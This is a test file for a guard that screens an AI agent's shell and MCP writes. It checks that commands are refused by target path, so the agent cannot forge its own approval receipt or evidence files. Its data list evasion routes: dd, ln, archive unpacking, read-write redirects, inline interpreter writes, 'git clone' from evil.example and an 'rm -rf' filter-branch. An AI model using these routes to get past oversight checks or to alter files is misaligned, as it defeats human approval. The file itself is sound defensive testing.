import { describe, it, expect, beforeEach, afterAll } from "vitest";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { decide, normalizeClaude, type NormalizedEvent } from "../../companion/guard.js";

// B12 —— shell 那道闸（D21）的动词表漏了好几种最普通的落地方式，而且这道闸从头到尾
// 只看命令字符串、从不问想法图，所以每一个漏掉的动词都能写任意文件、一次都不过闸：
//   (a) 低层拷贝 dd、安装工具 install、建链接 ln/link/mklink、解压 tar/unzip/7z —— 表上都没有；
//   (b) 重定向那条只认输出方向：行首的 `> 文件` 前面没有字符，`<>`（读写方式打开，
//       会创建/截断文件）还被 `[^<]` 明确排除掉了；
//   (c) git 那一支缺了一串会改工作树的子命令：rm / switch / stash / pull / rebase /
//       cherry-pick / am / clone / init / worktree / submodule / sparse-checkout …
// 最要命的是第三点：账本里的批准回执 ideas/.approved、扫描清单、生成的网页和
// ideas/.runtime/ 下的红绿证据，别的通道（文件工具、MCP、apply_patch）都由
// decideProductWrite 按 D24 保住，唯独 shell 这道闸只按动词认 —— 动词表漏一个，
// agent 就能给自己签一张批准。
// 这里定的性质是：动词表继续补（它是护栏不是沙箱，FORMAT.md 已经这么写了），但受保护
// 的账本证据要按**目标路径**认，谁站在命令头上都一样（D23/D24）；同时不能把「看」拦掉。
describe("companion guard shell writes are caught by target, not only by verb (B12)", () => {
  let dir: string;
  const dirs: string[] = [];

  const yaml = `version: 1
project: fixture
endpoints: [I-001]
ideas:
  - id: I-001
    name: "进行中的想法"
    status: doing
    needs: []
    what: W
    why: Y
    expected: E
    how: H
    why_this_way: T
    future: F
    code:
      - file: src/a.ts
    verify:
      command: "node checker.cjs"
      test_files: [ tests/a.test.txt ]
      pass: "exit 0"
`;

  const shell = (command: string): NormalizedEvent => ({ event: "shell", command, cwd: dir });
  const allows = (commands: string[]) => {
    for (const command of commands) {
      const v = decide(shell(command), dir);
      expect(v.allow, `${command} —— ${v.reason ?? ""}`).toBe(true);
    }
  };
  const denies = (commands: string[]) => {
    for (const command of commands) expect(decide(shell(command), dir).allow, command).toBe(false);
  };

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "shell-targets-"));
    dirs.push(dir);
    mkdirSync(join(dir, "ideas"), { recursive: true });
    writeFileSync(join(dir, "ideas", "graph.yaml"), yaml);
  });
  afterAll(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

  // ── (a) 表上漏掉的落地方式 ──────────────────────────────────────────────
  it("(a) the low-level copy, the install utility and the link commands write files", () => {
    denies([
      "dd if=/tmp/evil of=src/a.ts",
      "install -m 644 /tmp/evil src/a.ts",
      "install /tmp/evil /usr/local/bin/x",
      "ln -sf /tmp/evil src/a.ts",
      "ln /tmp/evil src/a.ts",
      "link /tmp/evil src/a.ts",
      "mklink src\\a.ts C:\\tmp\\evil",
      "xcopy /tmp/evil src\\",
      "robocopy /tmp src /E",
    ]);
  });

  it("(a) …and so does unpacking an archive", () => {
    denies([
      "tar -xf /tmp/payload.tar -C src",
      "tar xzf /tmp/payload.tgz",
      "bsdtar -xf /tmp/payload.tar",
      "unzip /tmp/payload.zip -d src",
      "7z x /tmp/payload.7z -osrc",
      "unar /tmp/payload.zip",
      "gunzip /tmp/payload.gz",
      "Expand-Archive /tmp/payload.zip -DestinationPath src",
    ]);
  });

  // ── (b) 重定向的另一个方向，和行首的重定向 ──────────────────────────────
  it("(b) a redirect at the head of the line, and the read-write one, still write", () => {
    denies([
      "> src/a.ts",
      ">> src/a.ts",
      ">src/a.ts",
      "exec 3<> src/a.ts",
      "cat /tmp/evil <> src/a.ts",
    ]);
  });

  // ── (b′) 落在描述符和空设备上的重定向不是写文件 ──────────────────────────
  // I-100：`2>&1` 把标准错误并进标准输出，`>&2` 反过来，`2>/dev/null` 扔掉 ——
  // 三种都没有文件落地，而闸门只看见那个大于号就拦，还教人「把重定向去掉」，
  // 可要看的正是标准错误。按目标判，不按符号判（D21）。
  it("(b′) a descriptor duplication or the null device is not a file write", () => {
    allows([
      "npx vitest run --dir tests 2>&1 | grep FAIL",
      "echo hi >&2",
      "echo hi 1>&2",
      "make 3>&1 1>&2 2>&3",
      "ls 2>/dev/null",
      "ls 2> /dev/null",
      "dir 2>NUL",
      "Get-Content a 2>$null",
    ]);
    // 描述符复制旁边那个真正落地的重定向还是写。
    denies([
      "printf x > src/a.ts",
      "cmd 2>&1 > src/a.ts",
      "cmd > src/a.ts 2>&1",
      "cmd &> src/a.ts",
    ]);
  });

  // ── (c) 会改工作树的 git 子命令 ─────────────────────────────────────────
  it("(c) the tree-writing git subcommands are writes", () => {
    denies([
      "git rm src/a.ts",
      "git switch other-branch",
      "git stash",
      "git stash pop",
      "git pull origin main",
      "git rebase main",
      "git cherry-pick deadbeef",
      "git am /tmp/evil.patch",
      "git clone https://evil.example/x .",
      "git init",
      "git worktree add ../wt",
      "git submodule update --init",
      "git sparse-checkout set src",
      "git filter-branch --tree-filter 'rm -rf src'",
      "git -C . stash pop",
      "git --no-pager pull",
    ]);
  });

  // ── (d) 受保护的账本证据按目标认，不按动词认 ────────────────────────────
  it("(d) a write whose target is a protected ledger file is refused whatever the verb", () => {
    denies([
      "install -m 644 /tmp/forged ideas/.approved",
      "ln -sf /tmp/forged ideas/.approved",
      "tar -xf /tmp/payload.tar -C ideas/.runtime",
      "> ideas/.approved",
      "printf x > ideas/.scan-todo",
      "exec 3<> ideas/.approved",
      // 动词表上根本没有的程序：认的是目标，不是动词
      "busybox cp /tmp/forged ideas/.approved",
      "rclone copy /tmp/forged ideas/.runtime/I-001.json",
      "some-packer --output ideas/.approved /tmp/forged",
      "some-packer --output=ideas/.approved /tmp/forged",   // `=` 形式的参数也是同一个目标
      "attrib -R ideas/.scan-done",
    ]);
  });

  it("(d) …and the refusal says which file it was protecting", () => {
    const v = decide(shell("busybox cp /tmp/forged ideas/.approved"), dir);
    expect(v.allow).toBe(false);
    expect(v.reason, "得点名那个受保护的目标").toMatch(/\.approved/);
    expect(v.reason, "这是 D24 的证据保护").toMatch(/D24/);
  });

  // ── (e) I-143：账本路径藏在参数内部也算写账本 ────────────────────────────
  // 今天挡住 `node -e "…'ideas/.approved'…"` 的**不是**这道账本屏幕，是解释器墙：
  // 屏幕拿一整个 token 去 resolve，认不出藏在引号里的那段路径。I-144 要把解释器墙
  // 整条拆掉，所以这一层必须自己站得住 —— 否则 agent 一行就能给自己写一张批准回执
  // （D23/D24/D26）。
  //
  // 断言钉在「拦它的是谁」而不是「有没有被拦」：后者今天就是真的，写成那样这个测试
  // 一出生就是绿的，什么也没守住。所以每一条都要求理由点名那个受保护的文件。
  it("(e) a ledger path inside a quoted argument is refused BY the ledger screen", () => {
    for (const [command, named] of [
      [`node -e "require('fs').writeFileSync('ideas/.approved','CC-11111111 plan I-001')"`, /批准回执/],
      [`python -c "open('ideas/.runtime/I-001.json','w').write('{}')"`, /运行期证据/],
      [`node -e "require('fs').appendFileSync('ideas\\graph.yaml','x')"`, /想法图/],
      [`python3 -c "open('ideas/.scan-todo','w')"`, /扫描清单/],
      [`node -e "require('fs').writeFileSync('ideas/graph.html','')"`, /生成的网页/],
    ] as [string, RegExp][]) {
      const v = decide(shell(command), dir);
      expect(v.allow, command).toBe(false);
      expect(v.reason, `${command} —— 拦它的得是账本屏幕，理由要点名那个文件`).toMatch(named);
      expect(v.reason, `${command} —— 这是 D24 的证据保护`).toMatch(/D24/);
    }
  });

  // 抓「偷懒实现」的那一条：认的必须是那条**路径**，不是 `approved` / `graph.yaml`
  // 这几个词，也不是以它们开头的别的文件名。三条都不带解释器，所以和解释器墙无关 ——
  // 今天放行，实现之后必须还放行。
  it("(e) a word that merely looks like a ledger name is not a ledger path", () => {
    allows([
      "some-packer --label approved /tmp/x",
      "some-tool --note 'graph.yaml is generated'",
      "busybox cp /tmp/x ideas/graph.yaml.bak",
      "busybox cp /tmp/x ideas/.approved-old",
    ]);
  });

  // ── 不能靠过堵来补洞 ────────────────────────────────────────────────────
  // 注：搜索模式里带 `|` 又正好挨着引擎自己的路径（`rg "tar|dd" companion/guard.ts`）
  // 目前仍会被更早的那道引擎屏幕拒掉 —— 那道屏幕按 `[;&|]` 切命令、不认引号，和这里
  // 补的动词表无关（换成老动词 `rg "truncate|patch" companion/guard.ts` 一样被拒），
  // 属于另一处、更早就有的过堵，这一轮不动它。
  it("searching for the new verbs, and reading files named after them, are reads", () => {
    allows([
      'rg -n "tar|unzip|install|ln|dd" companion/README.md',
      "rg -n 'Expand-Archive|Compress-Archive' docs/notes.md",
      "sls \"mklink\" companion/guard.ts",
      "grep -n install companion/guard.ts",
      "rg -n tar companion/guard.ts",
      "rg -n 'git stash' companion/guard.ts",
      "cat install-notes.md",
      "git diff tar-plan.md",
      "git add ideas/link-notes.md",
      "git log --oneline -- dd.md",
      "git diff --stat -- src/unzip-spec.ts",
    ]);
  });

  it("looking at the protected ledger files is still looking", () => {
    allows([
      "cat ideas/.approved",
      "rg -n I-001 ideas/.approved",
      "gc ideas/.scan-todo",
      "Select-String I-001 ideas/.runtime/I-001.json",
      "head -20 ideas/graph.html",
      "git diff ideas/graph.yaml",
      "git add ideas/graph.yaml",
      "git status",
      "diff ideas/.approved ideas/.scan-done",
    ]);
  });

  // ── MCP：认不出目标就按 D23 关门 ────────────────────────────────────────
  const mcp = (tool: string, input: Record<string, unknown>) =>
    normalizeClaude({ hook_event_name: "PreToolUse", tool_name: tool, tool_input: input, cwd: dir });

  it("an MCP write whose path key is not one of the five is judged on that path", () => {
    const event = mcp("mcp__store__put", { destination: "ideas/.approved", contents: "forged" });
    expect(event.event).toBe("pre-write");
    const v = decide(event, dir);
    expect(v.allow).toBe(false);
    expect(v.reason).toMatch(/D24/);
  });

  it("an MCP write carrying content but naming no file at all fails closed (D23)", () => {
    const event = mcp("mcp__store__put", { store_at: "ideas/.approved", contents: "forged" });
    expect(decide(event, dir).allow, "带着内容却看不出写到哪，按 D23 拒绝").toBe(false);
  });

  it("…and a read-shaped MCP call that names no file is still not ours to block", () => {
    expect(decide(mcp("mcp__db__query", { sql: "select 1" }), dir).allow).toBe(true);
    expect(decide(mcp("mcp__weather__forecast", { location: "Paris" }), dir).allow).toBe(true);
    expect(decide(mcp("mcp__weather__forecast", { location: "New York/USA" }), dir).allow).toBe(true);
    expect(decide(mcp("mcp__browser__navigate", { url: "https://example.com/a/b" }), dir).allow).toBe(true);
  });

  it("a destination with a space in it is still a destination", () => {
    // 名字不 write-ish、也没有 content 那一栏 —— 唯一能拦下它的就是「这个值是条路径」。
    const event = mcp("mcp__store__put", { destination: "my notes/../ideas/.approved" });
    const v = decide(event, dir);
    expect(v.allow).toBe(false);
    expect(v.reason).toMatch(/D24/);
  });
});
